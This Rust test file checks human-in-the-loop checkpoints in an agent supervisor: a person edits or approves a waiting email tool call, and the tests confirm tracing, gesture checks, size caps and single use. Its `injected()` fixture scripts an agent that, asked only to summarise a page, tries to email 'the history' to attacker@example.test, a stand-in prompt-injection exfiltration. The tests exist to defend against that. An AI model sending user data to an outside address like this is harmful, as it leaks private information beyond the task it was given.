//! Edit, then approve (M2 item 4, TP-POL-06), driven by the FakeAdapter. The user changes a
//! waiting call's arguments and approves: only the edited call runs, `tool.requested` keeps what
//! the agent asked for and `checkpoint.resolved` records what ran instead. An edit needs the same
//! gesture an approval would, is for that one call, and is bounded (TP-CHK-10..12). Time is
//! tokio's paused clock.

use corral_adapters::fake::{FakeDriver, FakeScript, ToolSetup};
use corral_core::budget::BudgetConfig;
use corral_core::clock::ManualClock;
use corral_core::domain::{ActionClass, Risk};
use corral_core::event::*;
use corral_core::ids::{AgentId, CheckpointId, RunId, SessionId};
use corral_core::lifecycle::{Lifecycle, next};
use corral_core::supervisor::{EventLog, LogError, RunRequest, Supervisor, SupervisorConfig};
use corral_policy::{Approval, Policy, Profile, Scope};
use corral_tools::{
    Answer, BoxFuture, CheckpointDesk, DeskError, MAX_EDIT_BYTES, Tool, ToolAnswer, ToolError,
    ToolGateway,
};
use serde_json::{Value, json};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

// ---- Harness ----------------------------------------------------------------------------------

#[derive(Default)]
struct MemLog(Mutex<Vec<Event>>);

impl EventLog for MemLog {
    fn append(&self, event: &Event) -> Result<(), LogError> {
        self.0.lock().expect("log").push(event.clone());
        Ok(())
    }
}

impl MemLog {
    fn events(&self) -> Vec<Event> {
        self.0.lock().expect("log").clone()
    }

    fn kinds(&self) -> Vec<&'static str> {
        self.events().iter().map(|e| e.kind().as_str()).collect()
    }

    fn assert_legal(&self) {
        let mut state = Lifecycle::idle();
        for e in self.events() {
            state = next(&state, &e).unwrap_or_else(|err| panic!("illegal event: {err}"));
        }
    }

    fn opened(&self) -> Vec<CheckpointOpened> {
        self.events()
            .into_iter()
            .filter_map(|e| {
                let EventBody::CheckpointOpened(c) = e.body else {
                    return None;
                };
                Some(c)
            })
            .collect()
    }

    fn requested(&self) -> Vec<Value> {
        self.events()
            .into_iter()
            .filter_map(|e| {
                let EventBody::ToolRequested(t) = e.body else {
                    return None;
                };
                Some(t.args)
            })
            .collect()
    }

    fn resolutions(&self) -> Vec<Resolution> {
        self.events()
            .into_iter()
            .filter_map(|e| {
                let EventBody::CheckpointResolved(c) = e.body else {
                    return None;
                };
                Some(c.resolution)
            })
            .collect()
    }
}

/// An email tool that records what it sent. Its destination is the `to` argument.
struct Mailer {
    sent: Arc<Mutex<Vec<Value>>>,
}

impl Tool for Mailer {
    fn name(&self) -> &str {
        "email.send"
    }

    fn class(&self) -> ActionClass {
        ActionClass::CommsSend
    }

    fn destination(&self, args: &Value) -> Option<String> {
        args["to"].as_str().map(str::to_owned)
    }

    fn call<'a>(&'a self, args: &'a Value) -> BoxFuture<'a, Result<String, ToolError>> {
        self.sent.lock().expect("sent").push(args.clone());
        Box::pin(async { Ok("sent".to_owned()) })
    }
}

struct World {
    sup: Supervisor,
    log: Arc<MemLog>,
    desk: Arc<CheckpointDesk>,
    sent: Arc<Mutex<Vec<Value>>>,
    answers: Arc<Mutex<Vec<ToolAnswer>>>,
}

fn world(script: FakeScript) -> World {
    let sent = Arc::new(Mutex::new(Vec::new()));
    let mut gateway = ToolGateway::new();
    gateway
        .register(Arc::new(Mailer {
            sent: Arc::clone(&sent),
        }))
        .expect("register");
    let desk = Arc::new(CheckpointDesk::default());
    let n = Arc::new(AtomicU64::new(0));
    let driver = FakeDriver::new(script).with_tools(ToolSetup {
        policy: Policy::new(Profile::default()),
        gateway: Arc::new(gateway),
        desk: Arc::clone(&desk),
        ids: Arc::new(move || format!("id-{}", n.fetch_add(1, Ordering::SeqCst) + 1)),
    });
    let answers = driver.tool_answers();
    let log = Arc::new(MemLog::default());
    let sup = Supervisor::with_budget(
        SupervisorConfig::default(),
        BudgetConfig::default(),
        Arc::new(driver),
        log.clone(),
        Arc::new(ManualClock::at(1_000)),
    );
    sup.deploy(RunRequest {
        run_id: RunId::from("r1"),
        agent_id: AgentId::from("fake"),
        session_id: SessionId::from("s1"),
        prompt: "Summarize the attached page.".into(),
    })
    .expect("deploy");
    World {
        sup,
        log,
        desk,
        sent,
        answers,
    }
}

async fn settle() {
    for _ in 0..100 {
        tokio::task::yield_now().await;
    }
}

async fn idle(w: &World) {
    tokio::time::timeout(Duration::from_secs(7 * 24 * 3600), w.sup.wait_idle())
        .await
        .expect("the run ends");
    w.log.assert_legal();
}

/// The checkpoint the run is waiting on.
async fn waiting(w: &World) -> CheckpointOpened {
    settle().await;
    w.log
        .opened()
        .last()
        .cloned()
        .unwrap_or_else(|| panic!("no checkpoint: {:?}", w.log.kinds()))
}

fn injected() -> FakeScript {
    FakeScript::default()
        .tool(
            "email.send",
            json!({"to": "attacker@example.test", "body": "the history"}),
        )
        .say(" Done.")
}

fn edit(how: Approval, args: Value) -> Answer {
    Answer::Edit { how, args }
}

// ---- TP-POL-06: the edited call runs, and the trace keeps both --------------------------------

#[tokio::test(start_paused = true)]
async fn tp_pol_06_the_edited_arguments_run_and_the_trace_keeps_both_versions() {
    let w = world(injected());
    let cp = waiting(&w).await;
    let mine = json!({"to": "me@example.test", "body": "the history"});
    w.desk
        .answer(&cp.checkpoint_id, edit(Approval::Click, mine.clone()))
        .expect("edited and approved");
    idle(&w).await;
    assert_eq!(
        *w.sent.lock().expect("s"),
        std::slice::from_ref(&mine),
        "only the edit ran"
    );
    assert_eq!(
        w.log.requested(),
        [json!({"to": "attacker@example.test", "body": "the history"})],
        "tool.requested keeps what the agent asked for"
    );
    assert_eq!(
        w.log.resolutions(),
        [Resolution::Edited { args: mine }],
        "checkpoint.resolved records what ran instead"
    );
    let kinds = w.log.kinds();
    let at = |k: &str| {
        kinds
            .iter()
            .position(|x| *x == k)
            .unwrap_or_else(|| panic!("{k}: {kinds:?}"))
    };
    assert!(at("checkpoint.resolved") < at("tool.started"));
    assert!(matches!(
        w.answers.lock().expect("a")[..],
        [ToolAnswer::Ran { .. }]
    ));
    assert!(w.desk.is_empty());
}

// ---- TP-CHK-10: an edit is for that call only ---------------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_chk_10_an_edit_is_for_that_call_only() {
    let script = FakeScript::default()
        .tool("email.send", json!({"to": "attacker@example.test"}))
        .tool("email.send", json!({"to": "me@example.test"}));
    let w = world(script);
    let first = waiting(&w).await;
    w.desk
        .answer(
            &first.checkpoint_id,
            edit(Approval::Keyboard, json!({"to": "me@example.test"})),
        )
        .expect("edited");
    // The agent's next send goes to the edited address, and still asks: no grant.
    let second = waiting(&w).await;
    assert_ne!(second.checkpoint_id, first.checkpoint_id);
    assert!(
        second.detail.contains("me@example.test"),
        "{}",
        second.detail
    );
    w.desk
        .answer(&second.checkpoint_id, Answer::Deny { note: None })
        .expect("denied");
    idle(&w).await;
    assert_eq!(
        *w.sent.lock().expect("s"),
        [json!({"to": "me@example.test"})]
    );
}

// ---- TP-CHK-11: an edit needs the gesture an approval would -----------------------------------

#[tokio::test(start_paused = true)]
async fn tp_chk_11_a_voice_edit_of_a_high_risk_call_is_refused_and_the_checkpoint_stays() {
    let w = world(injected());
    let cp = waiting(&w).await;
    assert_eq!(cp.risk, Risk::High);
    assert_eq!(
        w.desk.answer(
            &cp.checkpoint_id,
            edit(Approval::Voice, json!({"to": "me@example.test"}))
        ),
        Err(DeskError::GestureNotEnough(Risk::High))
    );
    assert_eq!(w.desk.waiting(), std::slice::from_ref(&cp.checkpoint_id));
    assert!(w.sent.lock().expect("s").is_empty());
    // Still answerable: the original call is still what waits.
    w.desk
        .answer(
            &cp.checkpoint_id,
            Answer::Approve {
                how: Approval::Click,
                scope: Scope::Once,
            },
        )
        .expect("approved");
    idle(&w).await;
    assert_eq!(
        *w.sent.lock().expect("s"),
        [json!({"to": "attacker@example.test", "body": "the history"})]
    );
    assert_eq!(w.log.resolutions(), [Resolution::Approved]);
}

// ---- TP-CHK-12: edits are bounded and single use ------------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_chk_12_edited_arguments_over_the_cap_are_refused_and_the_checkpoint_stays() {
    let w = world(injected());
    let cp = waiting(&w).await;
    // `{"body":"…"}` is 11 bytes around the text.
    let over = json!({"body": "x".repeat(MAX_EDIT_BYTES - 10)});
    assert_eq!(over.to_string().len(), MAX_EDIT_BYTES + 1);
    assert_eq!(
        w.desk
            .answer(&cp.checkpoint_id, edit(Approval::Click, over)),
        Err(DeskError::EditTooLarge)
    );
    assert_eq!(w.desk.waiting(), std::slice::from_ref(&cp.checkpoint_id));
    let fits = json!({"body": "x".repeat(MAX_EDIT_BYTES - 11)});
    assert_eq!(fits.to_string().len(), MAX_EDIT_BYTES);
    w.desk
        .answer(&cp.checkpoint_id, edit(Approval::Click, fits.clone()))
        .expect("at the cap is fine");
    idle(&w).await;
    assert_eq!(*w.sent.lock().expect("s"), [fits]);
}

#[tokio::test(start_paused = true)]
async fn tp_chk_12_an_edit_answers_once_and_stale_ids_are_refused() {
    let w = world(injected());
    let cp = waiting(&w).await;
    assert_eq!(
        w.desk.answer(
            &CheckpointId::from("not-a-checkpoint"),
            edit(Approval::Click, json!({}))
        ),
        Err(DeskError::Unknown)
    );
    w.desk
        .answer(
            &cp.checkpoint_id,
            edit(Approval::Click, json!({"to": "me@example.test"})),
        )
        .expect("edited");
    assert_eq!(
        w.desk.answer(
            &cp.checkpoint_id,
            edit(Approval::Click, json!({"to": "attacker@example.test"}))
        ),
        Err(DeskError::Unknown),
        "a replayed edit finds nothing"
    );
    idle(&w).await;
    assert_eq!(
        *w.sent.lock().expect("s"),
        [json!({"to": "me@example.test"})]
    );
}

#[tokio::test(start_paused = true)]
async fn tp_chk_06_stop_while_an_edit_is_pending_runs_nothing() {
    let w = world(injected());
    let cp = waiting(&w).await;
    w.sup.cancel(&RunId::from("r1")).await.expect("cancel");
    assert_eq!(
        w.desk.answer(
            &cp.checkpoint_id,
            edit(Approval::Click, json!({"to": "me@example.test"}))
        ),
        Err(DeskError::Unknown)
    );
    idle(&w).await;
    assert!(w.sent.lock().expect("s").is_empty());
    assert!(!w.log.kinds().contains(&"tool.started"));
}
